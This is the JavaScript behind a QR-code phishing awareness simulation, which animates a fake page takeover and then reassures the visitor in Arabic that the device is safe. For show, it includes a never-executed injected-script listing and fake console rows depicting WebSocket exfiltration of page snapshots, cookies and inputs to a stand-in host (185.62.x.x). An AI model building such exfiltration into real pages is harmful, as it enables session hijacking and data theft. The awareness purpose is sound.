/* Nabbih — QR awareness simulation.
   Purely visual: no network calls except loading this site's own config/logo,
   no permissions, no data collection, nothing leaves the device. */
(function () {
  "use strict";

  var $ = function (s) { return document.querySelector(s); };
  var body = document.body;
  var params = new URLSearchParams(location.search);
  var calm = params.has("calm") ||
    (window.matchMedia && matchMedia("(prefers-reduced-motion: reduce)").matches);
  if (calm) body.classList.add("calm");

  var themeMeta = document.querySelector('meta[name="theme-color"]');
  function theme(c) {
    if (themeMeta) themeMeta.setAttribute("content", c);
    document.documentElement.style.backgroundColor = c;
  }

  /* ---------- immersive: real fullscreen only where the browser allows it ----------
     Browsers only grant fullscreen in response to a user gesture, so we ask on the
     visitor's first natural touch (never via a button, never blocking exit).
     iPhone Safari has no page fullscreen; there the layout fills the visible area. */
  function tryFullscreen() {
    var el = document.documentElement;
    var req = el.requestFullscreen || el.webkitRequestFullscreen;
    if (!req || document.fullscreenElement || document.webkitFullscreenElement) return;
    try { var r = req.call(el, { navigationUI: "hide" }); if (r && r.catch) r.catch(function () {}); } catch (e) {}
  }
  addEventListener("pointerdown", tryFullscreen, { once: true, passive: true });

  /* ---------- config (editable without rebuilding) ---------- */
  var cfg = {};
  function applyConfig(c) {
    cfg = c || {};
    document.querySelectorAll("[data-cfg]").forEach(function (el) {
      var v = cfg[el.getAttribute("data-cfg")];
      if (typeof v === "string" && v) el.textContent = v;
    });
    document.querySelectorAll("[data-cfg-html]").forEach(function (el) {
      var v = cfg[el.getAttribute("data-cfg-html")];
      if (typeof v === "string" && v) el.innerHTML = v;
    });
    if (cfg.pageTitle) document.title = cfg.pageTitle;
  }
  var configReady = fetch("config.json", { cache: "no-cache" })
    .then(function (r) { return r.ok ? r.json() : {}; })
    .catch(function () { return {}; })
    .then(function (c) { applyConfig(c); });

  /* ---------- timeline helpers ---------- */
  var timers = [];
  function at(ms, fn) { timers.push(setTimeout(fn, ms)); }
  function clearAll() { timers.forEach(clearTimeout); timers = []; }
  function phase(name) {
    body.className = body.className.replace(/\bphase-\S+/g, "").trim() + " phase-" + name;
  }
  function on(c) { body.classList.add(c); }
  function off(c) { body.classList.remove(c); }
  function pulse(fn, undo, ms) { fn(); at(ms, undo); }

  /* ---------- optional sound (only if the browser already allows audio) ---------- */
  var snd = { ctx: null, out: null, noise: null, hum: [] };
  function soundInit() {
    try {
      var AC = window.AudioContext || window.webkitAudioContext;
      if (!AC) return;
      snd.ctx = new AC();
      snd.out = snd.ctx.createGain(); snd.out.gain.value = 0.55; snd.out.connect(snd.ctx.destination);
      var len = snd.ctx.sampleRate, buf = snd.ctx.createBuffer(1, len, snd.ctx.sampleRate), d = buf.getChannelData(0);
      for (var i = 0; i < len; i++) d[i] = Math.random() * 2 - 1;
      snd.noise = buf;
      if (snd.ctx.resume) snd.ctx.resume().catch(function () {});
      // a tap anywhere during the scene unlocks audio on browsers that require a gesture
      ["pointerdown", "touchstart", "keydown"].forEach(function (ev) {
        addEventListener(ev, function () { if (snd.ctx.state !== "running") snd.ctx.resume().catch(function () {}); }, { once: true, passive: true });
      });
    } catch (e) { snd.ctx = null; }
  }
  function live() { return snd.ctx && snd.ctx.state === "running"; }
  function sTick(f) {
    if (!live()) return;
    var t = snd.ctx.currentTime, o = snd.ctx.createOscillator(), g = snd.ctx.createGain();
    o.type = "square"; o.frequency.value = f || 2400;
    g.gain.setValueAtTime(0.035, t); g.gain.exponentialRampToValueAtTime(0.0001, t + 0.012);
    o.connect(g); g.connect(snd.out); o.start(t); o.stop(t + 0.02);
  }
  function sBurst(dur, freq, vol) {
    if (!live()) return;
    var t = snd.ctx.currentTime, s = snd.ctx.createBufferSource(), f = snd.ctx.createBiquadFilter(), g = snd.ctx.createGain();
    s.buffer = snd.noise; f.type = "bandpass"; f.frequency.value = freq || 1800; f.Q.value = 0.9;
    g.gain.setValueAtTime(vol || 0.22, t); g.gain.exponentialRampToValueAtTime(0.0001, t + dur);
    s.connect(f); f.connect(g); g.connect(snd.out); s.start(t, Math.random()); s.stop(t + dur + 0.02);
  }
  function sHum() {
    if (!live()) return;
    var t = snd.ctx.currentTime, g = snd.ctx.createGain();
    g.gain.setValueAtTime(0.0001, t); g.gain.exponentialRampToValueAtTime(0.16, t + 3.2); g.connect(snd.out);
    [46, 92.5].forEach(function (fq) {
      var o = snd.ctx.createOscillator(); o.type = "sawtooth"; o.frequency.value = fq;
      o.frequency.linearRampToValueAtTime(fq * 1.12, t + 3.2);
      var lp = snd.ctx.createBiquadFilter(); lp.type = "lowpass"; lp.frequency.value = 220;
      o.connect(lp); lp.connect(g); o.start(t); snd.hum.push(o);
    });
    snd.hum.push(g);
  }
  function sCut() { // total silence is part of the shock
    if (!snd.ctx) return;
    try { snd.out.gain.cancelScheduledValues(0); snd.out.gain.value = 0; } catch (e) {}
    snd.hum.forEach(function (n) { try { n.stop ? n.stop() : n.disconnect(); } catch (e) {} });
  }

  /* ---------- page-level effects ---------- */
  var intro = $("#intro"), title = $(".intro-title"), fx = $("#fx");
  function rectIn(el) {
    var r = el.getBoundingClientRect(), p = intro.getBoundingClientRect();
    return { x: r.left - p.left, y: r.top - p.top, w: r.width, h: r.height };
  }
  function paintFlash(el) {
    var r = rectIn(el), d = document.createElement("div");
    d.className = "pf";
    d.style.cssText = "left:" + r.x + "px;top:" + r.y + "px;width:" + r.w + "px;height:" + r.h + "px";
    fx.appendChild(d); at(400, function () { d.remove(); });
  }
  function vanish(el) { paintFlash(el); el.classList.add("gone"); sTick(1300); }
  function glitchTitle(cls, ms) {
    if (calm) return;
    title.setAttribute("data-text", title.textContent);
    title.classList.add("g"); if (cls) title.classList.add(cls);
    sBurst(ms / 1000, 2600, 0.12);
    at(ms, function () { title.classList.remove("g", "g2"); });
  }
  function rewriteTitle(text) {
    paintFlash(title);
    title.classList.add("hj");
    title.textContent = text; title.setAttribute("data-text", text);
    title.classList.remove("swap"); void title.offsetWidth; title.classList.add("swap");
    sBurst(0.18, 900, 0.3);
  }
  var bf = $("#bf");
  function blackFrame(ms, white) {
    if (calm) return;
    bf.classList.toggle("white", !!white); bf.classList.add("on");
    at(ms, function () { bf.classList.remove("on"); });
  }
  var frozen = false;
  function freeze(ms) {
    if (calm) return;
    frozen = true; on("frozen"); sCut(); // sound drops out with the picture
    at(ms, function () { frozen = false; off("frozen"); if (snd.ctx) snd.out.gain.value = 0.55; });
  }
  // precise tearing: a few designed horizontal bands of the live page, displaced
  var tearBox = $("#tear");
  function tear(bands, ms) {
    if (calm) return;
    tearBox.innerHTML = "";
    bands.forEach(function (b) {
      var s = document.createElement("div");
      s.className = "slice";
      s.style.clipPath = "inset(" + b[0] + "% 0 " + Math.max(0, 100 - b[0] - b[1]) + "% 0)";
      s.style.webkitClipPath = s.style.clipPath;
      s.style.transform = "translateX(" + b[2] + "px)";
      if (b[3]) s.style.filter = "invert(1)";
      s.appendChild(intro.cloneNode(true));
      tearBox.appendChild(s);
    });
    sBurst(ms / 1000 + 0.03, 1400, 0.25);
    at(ms, function () { tearBox.innerHTML = ""; });
  }
  var TEAR_A = [[21, 6, -11], [63, 3, 17]];
  var TEAR_B = [[7, 13, -24], [37, 2, 31], [69, 10, -15]];
  var TEAR_C = [[0, 28, 19], [28, 2, -42], [54, 21, -13], [86, 9, 27]];
  var TEAR_D = [[12, 2, 60], [44, 18, -8], [80, 1.5, -50]];

  /* ---------- console: suspicious activity inside this web page ---------- */
  var logEl = $("#log"), here = location.origin + location.pathname;
  var EARLY = [
    ["i", "Navigated to " + here, ""],
    ["v", "[Violation] 'setTimeout' handler took 214ms", "(index):88"],
    ["w", "Unexpected redirect: /p/qr → /r/7f3a2c (302)", "VM412:3"],
    ["i", "<script async src=\"//185.62.x.x/l.js\"> inserted into <head>", "VM412:7"],
    ["w", "document.cookie read by injected script", "l.js:1"],
    ["e", "Uncaught DOMException: Blocked a frame with origin \"null\" from accessing a cross-origin frame.", "l.js:1"],
    ["i", "MutationObserver: 3 nodes removed from #intro", "l.js:2"],
    ["w", "navigator.clipboard.readText() requested", "l.js:2"]
  ];
  var LATE = [ // act 1: the script settles in
    ["i", "Service worker registered — scope: /", "sw-x.js:14"],
    ["w", "Form field probed: input[type=password]", "l.js:3"],
    ["e", "Uncaught (in promise) TypeError: Failed to fetch", "l.js:3"],
    ["i", "postMessage → window.top  targetOrigin: *", "l.js:4"],
    ["w", "localStorage: keys enumerated", "l.js:4"],
    ["i", "h1.intro-title textContent rewritten", "l.js:6"],
    ["v", "[Violation] Forced reflow while executing JavaScript took 96ms", "l.js:5"],
    ["w", "history.pushState() overridden", "l.js:6"]
  ];
  var LATE2 = [ // act 2: it talks to the outside
    ["i", "WebSocket open: wss://185.62.x.x:8443/s", "l.js:5"],
    ["i", "fetch POST /c  (keepalive beacon)", "l.js:7"],
    ["e", "Refused to execute inline script — retrying via eval()", "l.js:7"],
    ["w", "Event listeners attached to document (×42)", "l.js:8"],
    ["i", "MutationObserver: #intro subtree observed", "l.js:8"],
    ["e", "WebSocket connection to 'wss://185.62.x.x:8443/' failed — reconnecting", "l.js:8"],
    ["i", "WebSocket open: wss://185.62.x.x:8443/s (2)", "l.js:8"],
    ["w", "setInterval(snapshot, 40) registered", "l.js:9"]
  ];
  var LATE3 = [ // act 3: it takes over the page
    ["i", "document.body subtree replaced", "l.js:9"],
    ["w", "Second session attached to this page", "l.js:10"],
    ["e", "Uncaught RangeError: Maximum call stack size exceeded", "l.js:9"],
    ["i", "snapshot → wss://185.62.x.x:8443/s  (frame 211)", "l.js:9"],
    ["w", "This page is now controlled by a script it did not load", "l.js:9"],
    ["e", "Uncaught Error: original document detached", "l.js:11"],
    ["i", "snapshot → wss://185.62.x.x:8443/s  (frame 212)", "l.js:9"],
    ["w", "Input events forwarded to remote session", "l.js:12"]
  ];
  function addRow(r) {
    var d = document.createElement("div");
    d.className = "row fresh " + r[0];
    var m = document.createElement("span"); m.className = "m"; m.textContent = r[1];
    d.appendChild(m);
    if (r[2]) { var s = document.createElement("span"); s.className = "s"; s.textContent = r[2]; d.appendChild(s); }
    logEl.appendChild(d);
    while (logEl.childNodes.length > 60) logEl.removeChild(logEl.firstChild);
    sTick(r[0] === "e" ? 900 : 2400);
  }
  var logOn = false;
  function streamLog(list, startGap, endGap, untilMs) {
    // gaps shrink from startGap to endGap: the activity visibly accelerates
    logOn = true;
    var i = 0, t0 = performance.now();
    (function next() {
      if (!logOn) return;
      var k = Math.min(1, (performance.now() - t0) / untilMs);
      if (!frozen) addRow(list[i++ % list.length]);
      var gap = calm ? Math.max(startGap, 220) : startGap + (endGap - startGap) * k * k;
      timers.push(setTimeout(next, gap));
    })();
  }

  /* ---------- network panel: waterfall of requests the page never asked for ---------- */
  var netEl = $("#netRows"), netT0 = 0;
  var NET = [["l.js", "200"], ["r/7f3a2c", "302"], ["c?id=e1f0", "(pending)"], ["sw-x.js", "200"], ["s", "101"],
             ["pixel.gif", "200"], ["c?id=93ab", "(blocked)"], ["m.wasm", "(pending)"], ["c?id=4d1e", "(failed)"]];
  var netOn = false;
  function streamNet() {
    netOn = true; netT0 = performance.now();
    var i = 0;
    (function next() {
      if (!netOn) return;
      if (!frozen) {
        var n = NET[i++ % NET.length], row = document.createElement("div");
        var off0 = Math.min(78, (performance.now() - netT0) / 22);
        row.className = "nr" + (/blocked|failed/.test(n[1]) ? " bad" : "");
        row.innerHTML = "<span></span><span class=st></span><i><b></b><b></b><b></b></i>";
        row.children[0].textContent = n[0]; row.children[1].textContent = n[1];
        var bs = row.querySelectorAll("b"), w1 = 2 + Math.random() * 4, w2 = 3 + Math.random() * 9, w3 = 2 + Math.random() * 12;
        bs[0].style.cssText = "left:" + off0 + "%;width:" + w1 + "%";
        bs[1].style.cssText = "left:" + (off0 + w1) + "%;width:" + w2 + "%";
        bs[2].style.cssText = "left:" + (off0 + w1 + w2) + "%;width:" + (/pending/.test(n[1]) ? 100 : w3) + "%";
        netEl.appendChild(row);
        while (netEl.childNodes.length > 20) netEl.removeChild(netEl.firstChild);
      }
      timers.push(setTimeout(next, calm ? 260 : 120));
    })();
  }

  /* ---------- Sources view: the injected script "running" (display only, never executed) ---------- */
  var SRC = [
    '<span class=c>// l.js — injected via redirect</span>',
    '<span class=k>const</span> s = <span class=k>new</span> WebSocket(<span class=q>"wss://185.62.x.x:8443/s"</span>);',
    'document.querySelectorAll(<span class=q>"input"</span>).forEach(probe);',
    'history.pushState(<span class=k>null</span>, <span class=q>""</span>, location.href);',
    'navigator.serviceWorker.register(<span class=q>"/sw-x.js"</span>);',
    '<span class=k>new</span> MutationObserver(mirror).observe(document.body, {subtree:<span class=k>true</span>});',
    'setInterval(() =&gt; s.send(snapshot(document)), <span class=q>40</span>);',
    's.onmessage = (m) =&gt; apply(JSON.parse(m.data));',
    'document.querySelector(<span class=q>"h1"</span>).textContent = m.title;',
    'replaceBody(m.html);',
    '<span class=k>debugger</span>;'
  ];
  var srcEl = $("#src"), srcTimer;
  function showSources() {
    srcEl.innerHTML = SRC.map(function (l) { return "<div>" + l + "</div>"; }).join("");
    var tabs = document.querySelectorAll(".dt-head span");
    tabs[1].classList.remove("on"); tabs[2].classList.add("on"); on("srcview");
    var lines = srcEl.children, i = 0;
    srcTimer = setInterval(function () {
      if (frozen) return;
      Array.prototype.forEach.call(lines, function (l) { l.classList.remove("x"); });
      lines[Math.min(i++, lines.length - 1)].classList.add("x"); sTick(1800);
    }, calm ? 260 : 150);
  }
  function showConsole() {
    clearInterval(srcTimer);
    var tabs = document.querySelectorAll(".dt-head span");
    tabs[2].classList.remove("on"); tabs[1].classList.add("on"); off("srcview");
  }
  // "Paused in debugger": everything on the page stops dead for a moment
  function debuggerPause(ms) {
    frozen = true; on("frozen"); on("paused"); sCut();
    at(ms, function () { frozen = false; off("frozen"); off("paused"); if (snd.ctx) snd.out.gain.value = 0.55; });
  }

  /* ---------- inspector highlight on the page title ---------- */
  var insp;
  function inspect(el) {
    var r = rectIn(el);
    insp = document.createElement("div"); insp.className = "insp";
    insp.style.cssText = "left:" + r.x + "px;top:" + r.y + "px;width:" + r.w + "px;height:" + r.h + "px";
    insp.innerHTML = "<div class=tip><b>h1</b>.intro-title<i>" + Math.round(r.w) + " × " + Math.round(r.h) + "</i></div>";
    fx.appendChild(insp); sTick(3200);
  }

  function endMiddle() {
    logOn = false; netOn = false; frozen = false;
    tearBox.innerHTML = ""; bf.classList.remove("on");
    clearInterval(srcTimer);
    ["stall", "dt-on", "taken", "net-on", "lb", "frozen", "paused", "srcview", "dim1", "dim2", "dim3", "dim4"].forEach(off);
    $("#skip").hidden = true;
    sCut();
  }

  /* ---------- the only ending: reassurance, then it stays put ---------- */
  function relief() {
    endMiddle();
    phase("safe"); theme("#050607");
    at(150, function () { $(".safe-1").classList.add("in"); });
    at(900, function () { $(".safe-2").classList.add("in"); });
    at(4500, function () { var r = $("#replay"); r.hidden = false; requestAnimationFrame(function () { r.classList.add("in"); }); });
  }

  /* ---------- master timeline (ms) ----------
     0.0–2.6   participation page, untouched (2 s longer than before)
     2.6–3.0   uneasy calm: loader stalls, a twitch, one dropped frame
     3.0–5.0   the page sheds elements, devtools open on their own, brown-out to black
     5.0–12.5  black escalation in three acts (rewrite · outside contact · takeover)
     12.5–13.1 hard cut: black, still, silent
     13.1→     "لا تخاف، جهازك آمن" — stays until the visitor leaves or replays */
  var D = 2000; // extra time on the opening page
  function run() {
    var badge = $(".intro-badge"), sub = $(".intro-sub"), loader = $(".intro-loader");
    var line1 = cfg.hijackLine1 || "هذه الصفحة لم تعد كما فتحتها",
        line2 = cfg.hijackLine2 || "من يتحكم بها الآن؟",
        line3 = cfg.hijackLine3 || "شخص آخر يشاهد هذه الصفحة الآن";
    soundInit();
    function t(ms, fn) { at(D + ms, fn); }

    // uneasy calm
    t(600, function () { on("stall"); });
    t(790, function () { if (!calm) pulse(function () { badge.style.transform = "translateX(3px)"; }, function () { badge.style.transform = ""; }, 70); sTick(5200); });
    t(960, function () { blackFrame(45); sBurst(0.05, 3000, 0.15); });

    // the page starts coming apart
    t(1060, function () { vanish(sub); glitchTitle(null, 90); $("#skip").hidden = false; });
    t(1260, function () { on("dt-on"); streamLog(EARLY, 260, 230, 1700); });
    t(1520, function () { vanish(loader); });
    t(1680, function () { glitchTitle(null, 110); });
    t(1860, function () { on("dim1"); theme("#d9dbdf"); sTick(700); });
    t(2060, function () { vanish(badge); });
    t(2160, function () { on("dim2"); theme("#7d8087"); });
    t(2230, function () { off("dim2"); });
    t(2290, function () { on("dim2"); sBurst(0.08, 400, 0.2); });
    t(2450, function () { tear(TEAR_A, 90); });
    t(2620, function () { on("dim3"); theme("#17181b"); sHum(); });
    t(2820, function () { glitchTitle("g2", 120); });

    // act 1 — black; the script rewrites the page
    t(3000, function () { on("dim4"); on("taken"); theme("#0b0b0c"); logOn = false; streamLog(LATE, 240, 140, 2400); });
    t(3500, function () { inspect(title); });
    t(3900, function () { if (insp) insp.remove(); rewriteTitle(line1); });
    t(4150, function () { freeze(140); });
    t(4290, function () { blackFrame(40); });

    // act 2 — it talks to the outside
    t(4600, function () { on("net-on"); streamNet(); sBurst(0.06, 2000, 0.15); logOn = false; streamLog(LATE2, 150, 90, 2200); });
    t(5000, function () { on("lb"); });
    t(5350, function () { tear(TEAR_B, 110); });
    t(5800, function () { glitchTitle("g2", 140); });
    t(6100, function () { inspect(title); });
    t(6350, function () { if (insp) insp.remove(); rewriteTitle(line2); });
    t(6650, function () { freeze(90); });
    t(6740, function () { blackFrame(30); });
    t(6950, function () { showSources(); });

    // act 3 — the debugger stops the world, then it takes over
    t(7700, function () { debuggerPause(calm ? 900 : 750); });
    t(8460, function () { showConsole(); logOn = false; streamLog(LATE3, 90, 32, 2000); tear(TEAR_C, 70); });
    t(8700, function () { rewriteTitle(line3); });
    t(9100, function () { tear(TEAR_B, 90); });
    t(9400, function () { glitchTitle("g2", 160); });
    t(9650, function () { freeze(80); });
    t(9730, function () { blackFrame(30); });
    t(9900, function () { tear(TEAR_D, 60); });
    t(10050, function () { tear(TEAR_C, 60); });
    t(10200, function () { glitchTitle("g2", 200); });
    t(10330, function () { blackFrame(30); });
    t(10420, function () { tear(TEAR_C, 60); });

    // hard cut: everything disappears at once — black, still, silent
    t(10500, function () { endMiddle(); phase("void"); theme("#000000"); });
    t(11100, relief);
  }

  $("#skip").addEventListener("click", function () { clearAll(); relief(); });
  $("#replay").addEventListener("click", function () {
    var u = new URL(location.href); u.searchParams.set("r", Date.now().toString(36)); location.replace(u.toString());
  });

  /* ---------- start: automatically, as soon as page is visible & font ready ---------- */
  var started = false;
  function start() {
    if (started) return; started = true;
    run();
  }
  function whenVisible() {
    if (document.visibilityState === "hidden") {
      document.addEventListener("visibilitychange", function h() {
        if (document.visibilityState === "visible") { document.removeEventListener("visibilitychange", h); start(); }
      });
    } else start();
  }
  var fontsReady = (document.fonts && document.fonts.ready) || Promise.resolve();
  var cap = new Promise(function (r) { setTimeout(r, 700); });
  Promise.race([Promise.all([fontsReady, configReady]), cap]).then(whenVisible);
})();
